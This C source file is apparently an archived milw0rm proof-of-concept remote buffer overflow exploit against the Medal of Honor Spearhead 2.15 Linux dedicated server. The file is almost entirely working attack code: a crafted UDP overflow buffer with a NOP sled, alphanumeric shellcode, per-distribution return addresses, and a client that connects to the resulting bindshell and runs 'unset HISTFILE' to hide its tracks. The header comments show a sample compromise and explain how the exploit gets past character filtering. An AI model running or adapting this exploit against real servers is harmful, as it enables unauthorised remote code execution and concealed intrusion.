/* -------------------------------------------------------------------------------------------------
Remote buffer overflow exploit for Medal of Honor Spearhead Dedicated Server (Linux)
----------------------------------------------------------------------------------------------------


earthangel:/home/millhouse# ./mohexp -h 127.0.0.1 -p 12203 -t 1
===================================================
Medal of Honor Spearhead Dedicated server for Linux
Remote buffer overflow exploit millhouse@IRCnet
===================================================
[-] Found Spearhead 2.15 (Linux)
[-] Target: 0xbfff30f0 Debian 3.0
[-] Sending buffer...
[-] Trying to reach bindshell...

Linux earthangel 2.4.28 #1 SMP Sat Dec 25 23:50:47 CET 2004 i686 unknown
uid=1001(spearhead) gid=1000(users) groups=1000(users)


Affected versions:
------------------
This exploit was tested with Spearhead 2.15. Its the latest version and this
is the most used one. Versions lower than 2.15 are vulnerable too.

Also vulnerable:

- Allied Assault 1.11v9 and below
- Breakthrough 2.40b and below

Background:
-----------
This bug was original discovered by Luigi Auriemma in Summer 2004.
Read http://aluigi.altervista.org/adv/mohaabof-adv.txt for further
informations.

The main problem exploiting this bug is that the Medal of Honor
server is filtering a couple of characters what makes it impossible
to bring up some classical shellcode with the buffer. The only way
to make code execution possible is an alphanumeric shellcode.

Other problem is that the return address must point exactly to the
beginning of the shellcode decoder. We fixed that with a little
workaround and are now able to jump in a range of no operation
instructions. Anyway, we can't bruteforce any offsets here cause
we're exploiting the main thread so there is just one shot ;)

Note:
-----
This is a proof of concept exploit. I guess bindshells are out of date
in fact that nearly every server should be firewalled today. A connect
back shell needs individual changes like the IP and port that means u
have to compile the alpha shellcode completely new and fit it into the
buffer. Have fun dealing with this issue :)



- Thanx to nul for some assembler lessons.
- Thanx to rix@phrack for his shellcode compiler.
- Thanx to servie, error` and zakx for making different platforms available.


-------------------------------------------------------------------------------------
Everytime you spank the monkey, god kills a kitten!!
------------------------------------------------------------------------------------- */

#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <netdb.h>
#include <getopt.h>

char inforeq[] = "\xff\xff\xff\xff\x02"
"\x67\x65\x74\x69\x6E\x66\x6F\x20";

char statusreq[] = "\xff\xff\xff\xff\x02"
"\x67\x65\x74\x73\x74\x61\x74\x75\x73\x20\x78\x78\x78\x5C\x6E";

char findme[] = "\x33\xc9\x81\xe9\x2d\xff\xff\xff\x8b\xd4\xf7\xda\x2b\xca\x90"
"\x90\x90\x90\x90";

char shellcode[] = "h6UcnX56UcnHTTPPSQPPaVRVUWBfRJfhTdfXf50efPDfh99DRUaA0TkahOzg"
"WY1Lkb1tkbfhZufXf1Dkff1tkfjmY0Lkij2X0Dkj0tkjj3Y0LkkjLX0Dkl0T"
"kljbX0DknjEY0Lkp0Tkpf1tkqhNNAvY1Lks1TksjSY0Lkw0tkwjeX0DkyjgX"
"0Dkz0TkzC0TkzCjAX0DkzCf1tkzCCjfY0Lkz0tkzCCj5Y0Lkz0TkzCjUX0Dk"
"zCC0TkzCCfhQofYf1LkzCCjrX0DkzC0TkzCfhn2fYf1Lkzf1TkzCCC0tkzCj"
"cY0Lkz0TkzC0tkzCjPX0Dkz0TkzCjRX0DkzCjfX0Dkz0TkzC0TkzCjGX0Dkz"
"C0tkzCjpX0Dkz0TkzC0tkzCjkY0Lkz0tkzCjbX0DkzCCCjKY0Lkz0tkzC0tk"
"zCCjMY0LkzC0tkzCj4X0DkzCjCY0Lkz0tkzC0tkzCjrX0DkzC0tkzCCjaY0L"
"kzCjgY0Lkz0tkzC0TkzCCCjsX0Dkz0tkzCf1tkzCC0tkzCfhjvfXf1Dkzf1t"
"kzCCCCjkY0LkzCjIY0Lkz0tkzCCCj9X0DkzC0tkzCfhnQfXf1Dkzf1tkzCCj"
"5X0DkzC0tkzCfha4fXf1Dkzf1TkzCCjHX0DkzC0TkzCfhY4fYf1Lkzf1TkzC"
"CjeY0Lkz0TkzCjPX0DkzCjBX0Dkz0TkzC0TkzCjmX0Dkz0TkzCjPY0Lkz363"
"lsqKStI9h2sqPAC52ZBkXaEwvBnA96ipCN6m3aVKoGtFfvHOSOTbcMxqJTbm"
"dbORgtG5JxbqJOnAluMqJr4EzbVEKJwJi7fsoCHSfKJqJ";
struct {

char *type;
unsigned long ret;

} targets[] = {
{ "Debian 3.0", 0xbfff30f0 },
{ "Debian 3.1", 0xbfff2c90 },
{ "SuSE 8.1 ", 0xbfff2a90 },
{ "SuSE 9.0 ", 0xbfff2b30 }, // worx also for 8.2 fine
{ "Fedora 1 ", 0xbfff2da0 },
{ "Crash ", 0xdeadbeef },
};

void usage(char *proc)
{

int i;

fprintf(stderr, "Usage: %s <-h host> <-p port> <-t target>\n\n", proc);
fprintf(stderr, "Available targets:\n------------------\n");

for(i=0;i<6;i++)
fprintf(stdout, "%2d. %s [0x%08x]\n", i +1,
targets[i].type, (unsigned int) targets[i].ret);
fprintf(stderr, "\n");
exit(1);
}

int getinfo(char *host, int port)
{
int sockfd;
int version = -1;
char buffer[512];
struct sockaddr_in addr;
struct hostent *hp;

if((sockfd = socket(AF_INET, SOCK_DGRAM, 0)) <0){
perror("can't open datagram\n");
exit(1);
}

if((hp = gethostbyname(host)) == 0){
perror("gethostbyname\n");
exit(1);
}

bzero((char *)&addr, sizeof(addr));
addr.sin_family = AF_INET;
bcopy((char *)hp->h_addr, (char *)&addr.sin_addr, hp->h_length);
addr.sin_port = htons(port);

if(sendto(sockfd, statusreq, strlen(statusreq) * sizeof(char), 0,
(struct sockaddr *)&addr, sizeof(addr)) <0){
perror("sendto\n");
exit(1);
}
usleep(70000);

if(read(sockfd, buffer, sizeof(buffer)-1) <0){
perror("read\n");
exit(1);
}

if(strstr(buffer, "linux-i386")){
version = 0;
}

return version;
}

int shell(char *host)
{
fd_set fd_read;
char buffer[2048];
char *cmd = "unset HISTFILE;uname -a;id;\n";
int n, port = 6000;
int sockfd;
struct sockaddr_in addr;
struct hostent *hp;

hp = gethostbyname(host);

if((sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) <0){
perror("can't open socket\n");
exit(1);
}

bzero((char *)&addr, sizeof(addr));
addr.sin_family = AF_INET;
bcopy((char *)hp->h_addr, (char *)&addr.sin_addr, hp->h_length);
addr.sin_port = htons(port);

if(connect(sockfd, (struct sockaddr *)&addr, sizeof(addr))<0){
printf("[-] Connect to bindshell failed\n");
return -1;
}

FD_ZERO(&fd_read);
FD_SET(sockfd, &fd_read);
FD_SET(0, &fd_read);

send(sockfd, cmd, strlen(cmd), 0);

while(1) {
FD_SET(sockfd, &fd_read);
FD_SET(0, &fd_read);

if(select(sockfd+1, &fd_read, NULL, NULL, NULL)<0)
break;

if( FD_ISSET(sockfd, &fd_read) ){
if((n = recv(sockfd, buffer, sizeof(buffer), 0))<0){
fprintf(stderr, "EOF\n");
exit(2);
}
if(write(1,buffer, n)<0)
break;
}

if ( FD_ISSET(0, &fd_read) ) {
if((n = read(0,buffer, sizeof(buffer)))<0){
fprintf(stderr,"EOF\n");
exit(2);
}
if(send(sockfd, buffer, n, 0)<0)
break;
}

usleep(10);

}
fprintf(stderr,"Connection lost.\n");
exit(0);
}

int exploit(char *host, int port, int target)
{
int sockfd;
char buffer[1046];
char retaddr[4];
struct sockaddr_in addr;
struct hostent *hp;

if((sockfd = socket(AF_INET, SOCK_DGRAM, 0)) <0){
perror("can't open datagram\n");
exit(1);
}

hp = gethostbyname(host);
bzero((char *)&addr, sizeof(addr));
addr.sin_family = AF_INET;
bcopy((char *)hp->h_addr, (char *)&addr.sin_addr, hp->h_length);
addr.sin_port = htons(port);

retaddr[0] = (targets[target-1].ret & 0x000000ff);
retaddr[1] = (targets[target-1].ret & 0x0000ff00)>>8;
retaddr[2] = (targets[target-1].ret & 0x00ff0000)>>16;
retaddr[3] = (targets[target-1].ret & 0xff000000)>>24;

memset(buffer, 0x00, sizeof(buffer));
memcpy(buffer, inforeq, 13);
memset(buffer+13, 0x90, 138);
memcpy(buffer+151, findme, strlen(findme));
memcpy(buffer+170, shellcode, strlen(shellcode));
memset(buffer+995, 0x90, 42);
memcpy(buffer+1037, retaddr, 4);
memcpy(buffer+1041, retaddr, 4);
buffer[1046] = '\n';

if(sendto(sockfd, buffer, strlen(buffer) * sizeof(char), 0,
(struct sockaddr *)&addr, sizeof(addr)) <0){
perror("sendto\n");
exit(1);
}
usleep(7000);
printf("[-] Trying to reach bindshell...\n\n");
}

int main(int argc, char *argv[])
{
char host[256];
int opt, port;
int ver, stat;
int target = 0;
int pid;

fprintf(stdout, "===================================================\n");
fprintf(stdout, "Medal of Honor Spearhead Dedicated server for Linux\n");
fprintf(stdout, "Remote buffer overflow exploit millhouse@IRCnet\n");
fprintf(stdout, "===================================================\n");

memset(host, 0x00, sizeof(host));
while((opt = getopt(argc, argv, "h:p:t:")) != EOF)
{
switch(opt)
{
case 'h':
strncpy(host, optarg, sizeof(host)-1);
break;

case 'p':
port = atoi(optarg);
if((port<=0) || (port > 65535)){
fprintf(stderr, "[-] Specified port invalid\n");
return(-1);
}
break;

case 't':
target = atoi(optarg);
if ((target<1) || (target>6))
usage(argv[0]);
break;

default:
usage(argv[0]);
break;
}
}
if (strlen(host) == 0) usage(argv[0]);

ver = getinfo(host, port);

if(ver<0){
fprintf(stderr, "[-] Remote server is not a Spearhead 2.15\n");
fprintf(stderr, "[-] server or its running under Windows\n");
}
else {
printf("[-] Found Spearhead 2.15 (Linux)\n");
printf("[-] Target: 0x%08x ", (unsigned int) targets[target-1].ret);
printf("%s\n", targets[target-1].type);
printf("[-] Sending buffer...\n");

exploit(host, port, target);
sleep(3);
shell(host);
}

fprintf(stderr, "[-] Leaving...\n");
}

// milw0rm.com [2005-02-18]
